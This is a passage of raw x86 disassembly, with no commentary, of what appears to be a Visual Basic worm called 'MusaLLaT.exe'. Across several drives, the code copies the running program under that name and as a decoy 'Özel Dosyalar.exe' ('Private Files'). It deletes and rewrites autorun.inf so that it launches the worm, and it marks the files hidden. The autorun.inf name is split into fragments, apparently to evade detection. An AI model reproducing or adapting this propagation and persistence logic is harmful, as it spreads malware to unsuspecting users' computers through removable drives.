  mov var_12C, eax
  lea ecx, var_A4
  push ecx
  mov edx, var_12C
  mov eax, [edx]
  mov ecx, var_12C
  push ecx
  call [eax+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 0043F992h
  push 00000050h
  push 00418EF0h
  mov edx, var_12C
  push edx
  mov eax, var_130
  push eax
  call [00401058h]
  mov var_1D8, eax
  jmp 0043F99Ch
  mov var_1D8, 00000000h
  cmp [00460558h], 00000000h
  jnz 0043F9C1h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_1DC, 00460558h
  jmp 0043F9CBh
  mov var_1DC, 00460558h
  mov ecx, var_1DC
  mov edx, [ecx]
  mov var_134, edx
  lea eax, var_C0
  push eax
  mov ecx, var_134
  mov edx, [ecx]
  mov eax, var_134
  push eax
  call [edx+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 0043FA26h
  push 00000014h
  push 00418ED0h
  mov ecx, var_134
  push ecx
  mov edx, var_138
  push edx
  call [00401058h]
  mov var_1E0, eax
  jmp 0043FA30h
  mov var_1E0, 00000000h
  mov eax, var_C0
  mov var_13C, eax
  lea ecx, var_A8
  push ecx
  mov edx, var_13C
  mov eax, [edx]
  mov ecx, var_13C
  push ecx
  call [eax+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 0043FA89h
  push 00000058h
  push 00418EF0h
  mov edx, var_13C
  push edx
  mov eax, var_140
  push eax
  call [00401058h]
  mov var_1E4, eax
  jmp 0043FA93h
  mov var_1E4, 00000000h
  push 004195D8h ; "F:\Özel Dosyalar.exe"
  mov ecx, var_A4
  push ecx
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov edx, var_A8
  push edx
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A4
  push ecx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea edx, var_C0
  push edx
  lea eax, var_BC
  push eax
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 0000002Dh
  push 00419608h ; "F:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401110h]
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_A4
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 0000002Eh
  push 00419608h ; "F:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  lea eax, var_B8
  push eax
  call [00401188h]
  push eax
  call 00419468h ; DeleteFile(%x1v)
  call [00401054h]
  lea ecx, var_B8
  push ecx
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000006h
  call [00401150h]
  add esp, 0000001Ch
  mov var_4, 0000002Fh
  push 00419608h ; "F:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  push 00000001h
  push FFFFFFFFh
  push 00000002h
  call [0040112Ch]
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_A4
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000030h
  push 00419488h ; "[AutoRun]"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000031h
  push 004194A8h ; "Open=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000032h
  push 004194D0h ; "Shell\Open=Aç"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000033h
  push 004194F0h ; "Shell\Open\Command=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000034h
  push 00000001h
  call [004010A0h]
  mov var_4, 00000035h
  push 00000006h
  push 004195B0h ; "F:\MusaLLaT.exe"
  call [004011D0h]
  mov var_4, 00000036h
  push 00000006h
  push 00419608h ; "F:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [004011D0h]
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_A4
  push ecx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000037h
  mov var_F8, FFFFFFFFh
  mov var_100, 0000000Bh
  lea edx, var_100
  lea ecx, var_80
  call [00401010h]
  mov var_4, 00000039h
  mov var_F8, 00419618h ; "G:\"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea edx, var_D0
  push edx
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea eax, var_120
  push eax
  lea ecx, var_90
  push ecx
  lea edx, var_110
  push edx
  lea eax, var_E0
  push eax
  call [00401174h]
  push eax
  lea ecx, var_F0
  push ecx
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea edx, var_120
  push edx
  lea eax, var_D0
  push eax
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx ecx, var_124
  test ecx, ecx
  jz 00440A34h
  mov var_4, 0000003Ah
  cmp [00460558h], 00000000h
  jnz 00440044h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_1E8, 00460558h
  jmp 0044004Eh
  mov var_1E8, 00460558h
  mov edx, var_1E8
  mov eax, [edx]
  mov var_124, eax
  lea ecx, var_BC
  push ecx
  mov edx, var_124
  mov eax, [edx]
  mov ecx, var_124
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_128, eax
  cmp var_128, 00000000h
  jge 004400A9h
  push 00000014h
  push 00418ED0h
  mov edx, var_124
  push edx
  mov eax, var_128
  push eax
  call [00401058h]
  mov var_1EC, eax
  jmp 004400B3h
  mov var_1EC, 00000000h
  mov ecx, var_BC
  mov var_12C, ecx
  lea edx, var_A4
  push edx
  mov eax, var_12C
  mov ecx, [eax]
  mov edx, var_12C
  push edx
  call [ecx+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 0044010Ch
  push 00000050h
  push 00418EF0h
  mov eax, var_12C
  push eax
  mov ecx, var_130
  push ecx
  call [00401058h]
  mov var_1F0, eax
  jmp 00440116h
  mov var_1F0, 00000000h
  cmp [00460558h], 00000000h
  jnz 0044013Bh
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_1F4, 00460558h
  jmp 00440145h
  mov var_1F4, 00460558h
  mov edx, var_1F4
  mov eax, [edx]
  mov var_134, eax
  lea ecx, var_C0
  push ecx
  mov edx, var_134
  mov eax, [edx]
  mov ecx, var_134
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 004401A0h
  push 00000014h
  push 00418ED0h
  mov edx, var_134
  push edx
  mov eax, var_138
  push eax
  call [00401058h]
  mov var_1F8, eax
  jmp 004401AAh
  mov var_1F8, 00000000h
  mov ecx, var_C0
  mov var_13C, ecx
  lea edx, var_A8
  push edx
  mov eax, var_13C
  mov ecx, [eax]
  mov edx, var_13C
  push edx
  call [ecx+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 00440203h
  push 00000058h
  push 00418EF0h
  mov eax, var_13C
  push eax
  mov ecx, var_140
  push ecx
  call [00401058h]
  mov var_1FC, eax
  jmp 0044020Dh
  mov var_1FC, 00000000h
  push 00419624h ; "G:\MusaLLaT.exe"
  mov edx, var_A4
  push edx
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov eax, var_A8
  push eax
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A4
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea eax, var_C0
  push eax
  lea ecx, var_BC
  push ecx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 0000003Bh
  mov var_F8, 00419648h ; "G:\Özel Dosyalar.exe"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea edx, var_D0
  push edx
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea eax, var_120
  push eax
  lea ecx, var_90
  push ecx
  lea edx, var_110
  push edx
  lea eax, var_E0
  push eax
  call [00401174h]
  push eax
  lea ecx, var_F0
  push ecx
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea edx, var_120
  push edx
  lea eax, var_D0
  push eax
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx ecx, var_124
  test ecx, ecx
  jz 004403ACh
  jmp 0044064Ah
  mov var_4, 0000003Dh
  cmp [00460558h], 00000000h
  jnz 004403D8h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_200, 00460558h
  jmp 004403E2h
  mov var_200, 00460558h
  mov edx, var_200
  mov eax, [edx]
  mov var_124, eax
  lea ecx, var_BC
  push ecx
  mov edx, var_124
  mov eax, [edx]
  mov ecx, var_124
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_128, eax
  cmp var_128, 00000000h
  jge 0044043Dh
  push 00000014h
  push 00418ED0h
  mov edx, var_124
  push edx
  mov eax, var_128
  push eax
  call [00401058h]
  mov var_204, eax
  jmp 00440447h
  mov var_204, 00000000h
  mov ecx, var_BC
  mov var_12C, ecx
  lea edx, var_A4
  push edx
  mov eax, var_12C
  mov ecx, [eax]
  mov edx, var_12C
  push edx
  call [ecx+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 004404A0h
  push 00000050h
  push 00418EF0h
  mov eax, var_12C
  push eax
  mov ecx, var_130
  push ecx
  call [00401058h]
  mov var_208, eax
  jmp 004404AAh
  mov var_208, 00000000h
  cmp [00460558h], 00000000h
  jnz 004404CFh
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_20C, 00460558h
  jmp 004404D9h
  mov var_20C, 00460558h
  mov edx, var_20C
  mov eax, [edx]
  mov var_134, eax
  lea ecx, var_C0
  push ecx
  mov edx, var_134
  mov eax, [edx]
  mov ecx, var_134
  push ecx
  call [eax+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 00440534h
  push 00000014h
  push 00418ED0h
  mov edx, var_134
  push edx
  mov eax, var_138
  push eax
  call [00401058h]
  mov var_210, eax
  jmp 0044053Eh
  mov var_210, 00000000h
  mov ecx, var_C0
  mov var_13C, ecx
  lea edx, var_A8
  push edx
  mov eax, var_13C
  mov ecx, [eax]
  mov edx, var_13C
  push edx
  call [ecx+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 00440597h
  push 00000058h
  push 00418EF0h
  mov eax, var_13C
  push eax
  mov ecx, var_140
  push ecx
  call [00401058h]
  mov var_214, eax
  jmp 004405A1h
  mov var_214, 00000000h
  push 00419648h ; "G:\Özel Dosyalar.exe"
  mov edx, var_A4
  push edx
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov eax, var_A8
  push eax
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A4
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea eax, var_C0
  push eax
  lea ecx, var_BC
  push ecx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 0000003Fh
  push 00419678h ; "G:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401110h]
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000040h
  push 00419678h ; "G:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  lea ecx, var_B8
  push ecx
  call [00401188h]
  push eax
  call 00419468h ; DeleteFile(%x1v)
  call [00401054h]
  lea edx, var_B8
  push edx
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_A4
  push ecx
  push 00000006h
  call [00401150h]
  add esp, 0000001Ch
  mov var_4, 00000041h
  push 00419678h ; "G:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  push 00000001h
  push FFFFFFFFh
  push 00000002h
  call [0040112Ch]
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_AC
  push ecx
  lea edx, var_A8
  push edx
  lea eax, var_A4
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000042h
  push 00419488h ; "[AutoRun]"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000043h
  push 004194A8h ; "Open=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000044h
  push 004194D0h ; "Shell\Open=Aç"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000045h
  push 004194F0h ; "Shell\Open\Command=MusaLLaT.exe"
  push 00000001h
  push 004194A0h
  call [004010F0h]
  add esp, 0000000Ch
  mov var_4, 00000046h
  push 00000001h
  call [004010A0h]
  mov var_4, 00000047h
  push 00000006h
  push 00419624h ; "G:\MusaLLaT.exe"
  call [004011D0h]
  mov var_4, 00000048h
  push 00000006h
  push 00419678h ; "G:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [004011D0h]
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_A4
  push edx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000049h
  mov var_F8, FFFFFFFFh
  mov var_100, 0000000Bh
  lea edx, var_100
  lea ecx, var_90
  call [00401010h]
  mov var_4, 0000004Bh
  mov var_F8, 00419688h ; "H:\"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea eax, var_D0
  push eax
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea ecx, var_120
  push ecx
  lea edx, var_A0
  push edx
  lea eax, var_110
  push eax
  lea ecx, var_E0
  push ecx
  call [00401174h]
  push eax
  lea edx, var_F0
  push edx
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea eax, var_120
  push eax
  lea ecx, var_D0
  push ecx
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx edx, var_124
  test edx, edx
  jz 00441545h
  mov var_4, 0000004Ch
  cmp [00460558h], 00000000h
  jnz 00440B55h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_218, 00460558h
  jmp 00440B5Fh
  mov var_218, 00460558h
  mov eax, var_218
  mov ecx, [eax]
  mov var_124, ecx
  lea edx, var_BC
  push edx
  mov eax, var_124
  mov ecx, [eax]
  mov edx, var_124
  push edx
  call [ecx+00000014h]
  fnclex
  mov var_128, eax
  cmp var_128, 00000000h
  jge 00440BBAh
  push 00000014h
  push 00418ED0h
  mov eax, var_124
  push eax
  mov ecx, var_128
  push ecx
  call [00401058h]
  mov var_21C, eax
  jmp 00440BC4h
  mov var_21C, 00000000h
  mov edx, var_BC
  mov var_12C, edx
  lea eax, var_A4
  push eax
  mov ecx, var_12C
  mov edx, [ecx]
  mov eax, var_12C
  push eax
  call [edx+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 00440C1Dh
  push 00000050h
  push 00418EF0h
  mov ecx, var_12C
  push ecx
  mov edx, var_130
  push edx
  call [00401058h]
  mov var_220, eax
  jmp 00440C27h
  mov var_220, 00000000h
  cmp [00460558h], 00000000h
  jnz 00440C4Ch
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_224, 00460558h
  jmp 00440C56h
  mov var_224, 00460558h
  mov eax, var_224
  mov ecx, [eax]
  mov var_134, ecx
  lea edx, var_C0
  push edx
  mov eax, var_134
  mov ecx, [eax]
  mov edx, var_134
  push edx
  call [ecx+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 00440CB1h
  push 00000014h
  push 00418ED0h
  mov eax, var_134
  push eax
  mov ecx, var_138
  push ecx
  call [00401058h]
  mov var_228, eax
  jmp 00440CBBh
  mov var_228, 00000000h
  mov edx, var_C0
  mov var_13C, edx
  lea eax, var_A8
  push eax
  mov ecx, var_13C
  mov edx, [ecx]
  mov eax, var_13C
  push eax
  call [edx+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 00440D14h
  push 00000058h
  push 00418EF0h
  mov ecx, var_13C
  push ecx
  mov edx, var_140
  push edx
  call [00401058h]
  mov var_22C, eax
  jmp 00440D1Eh
  mov var_22C, 00000000h
  push 00419694h ; "H:\MusaLLaT.exe"
  mov eax, var_A4
  push eax
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov ecx, var_A8
  push ecx
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A4
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea ecx, var_C0
  push ecx
  lea edx, var_BC
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 0000004Dh
  mov var_F8, 004196B8h ; "H:\Özel Dosyalar.exe"
  mov var_100, 00000008h
  lea edx, var_100
  lea ecx, var_D0
  call [0040118Ch]
  push 00000000h
  lea eax, var_D0
  push eax
  call [00401120h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_118, ax
  mov var_120, 0000000Bh
  mov var_108, 00000000h
  mov var_110, 0000800Bh
  lea ecx, var_120
  push ecx
  lea edx, var_A0
  push edx
  lea eax, var_110
  push eax
  lea ecx, var_E0
  push ecx
  call [00401174h]
  push eax
  lea edx, var_F0
  push edx
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_124, ax
  lea ecx, var_A4
  call [004011CCh]
  lea eax, var_120
  push eax
  lea ecx, var_D0
  push ecx
  push 00000002h
  call [00401024h]
  add esp, 0000000Ch
  movsx edx, var_124
  test edx, edx
  jz 00440EBDh
  jmp 0044115Bh
  mov var_4, 0000004Fh
  cmp [00460558h], 00000000h
  jnz 00440EE9h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_230, 00460558h
  jmp 00440EF3h
  mov var_230, 00460558h
  mov eax, var_230
  mov ecx, [eax]
  mov var_124, ecx
  lea edx, var_BC
  push edx
  mov eax, var_124
  mov ecx, [eax]
  mov edx, var_124
  push edx
  call [ecx+00000014h]
  fnclex
  mov var_128, eax
  cmp var_128, 00000000h
  jge 00440F4Eh
  push 00000014h
  push 00418ED0h
  mov eax, var_124
  push eax
  mov ecx, var_128
  push ecx
  call [00401058h]
  mov var_234, eax
  jmp 00440F58h
  mov var_234, 00000000h
  mov edx, var_BC
  mov var_12C, edx
  lea eax, var_A4
  push eax
  mov ecx, var_12C
  mov edx, [ecx]
  mov eax, var_12C
  push eax
  call [edx+00000050h]
  fnclex
  mov var_130, eax
  cmp var_130, 00000000h
  jge 00440FB1h
  push 00000050h
  push 00418EF0h
  mov ecx, var_12C
  push ecx
  mov edx, var_130
  push edx
  call [00401058h]
  mov var_238, eax
  jmp 00440FBBh
  mov var_238, 00000000h
  cmp [00460558h], 00000000h
  jnz 00440FE0h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov var_23C, 00460558h
  jmp 00440FEAh
  mov var_23C, 00460558h
  mov eax, var_23C
  mov ecx, [eax]
  mov var_134, ecx
  lea edx, var_C0
  push edx
  mov eax, var_134
  mov ecx, [eax]
  mov edx, var_134
  push edx
  call [ecx+00000014h]
  fnclex
  mov var_138, eax
  cmp var_138, 00000000h
  jge 00441045h
  push 00000014h
  push 00418ED0h
  mov eax, var_134
  push eax
  mov ecx, var_138
  push ecx
  call [00401058h]
  mov var_240, eax
  jmp 0044104Fh
  mov var_240, 00000000h
  mov edx, var_C0
  mov var_13C, edx
  lea eax, var_A8
  push eax
  mov ecx, var_13C
  mov edx, [ecx]
  mov eax, var_13C
  push eax
  call [edx+00000058h]
  fnclex
  mov var_140, eax
  cmp var_140, 00000000h
  jge 004410A8h
  push 00000058h
  push 00418EF0h
  mov ecx, var_13C
  push ecx
  mov edx, var_140
  push edx
  call [00401058h]
  mov var_244, eax
  jmp 004410B2h
  mov var_244, 00000000h
  push 004196B8h ; "H:\Özel Dosyalar.exe"
  mov eax, var_A4
  push eax
  push 00418DA4h ; "\"
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  mov ecx, var_A8
  push ecx
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401158h]
  lea edx, var_B4
  push edx
  lea eax, var_B0
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A4
  push eax
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  lea ecx, var_C0
  push ecx
  lea edx, var_BC
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov var_4, 00000051h
  push 004196E8h ; "H:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  call [00401110h]
  lea eax, var_B4
  push eax
  lea ecx, var_B0
  push ecx
  lea edx, var_AC
  push edx
  lea eax, var_A8
  push eax
  lea ecx, var_A4
  push ecx
  push 00000005h
  call [00401150h]
  add esp, 00000018h
  mov var_4, 00000052h
  push 004196E8h ; "H:\a"
  push 00419380h ; "ut"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A4
  call [004011ACh]
  push eax
  push 0041938Ch ; "or"
  call [00401044h]
  mov edx, eax
  lea ecx, var_A8
  call [004011ACh]
  push eax
  push 00419398h ; "un."
  call [00401044h]
  mov edx, eax
  lea ecx, var_AC
  call [004011ACh]
  push eax
  push 004193A4h
  call [00401044h]
  mov edx, eax
  lea ecx, var_B0
  call [004011ACh]
  push eax
  push 004193ACh ; "nf"
  call [00401044h]
  mov edx, eax
  lea ecx, var_B4
  call [004011ACh]
  push eax
  lea edx, var_B8
  push edx
  call [00401188h]
  push eax
  call 00419468h ; DeleteFile(%x1v)
  call [00401054h]
  lea eax, var_B8
  push eax
  lea ecx, var_B4
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_AC
  push eax
  lea ecx, var_A8
  push ecx
  lea edx, var_A4
  push edx
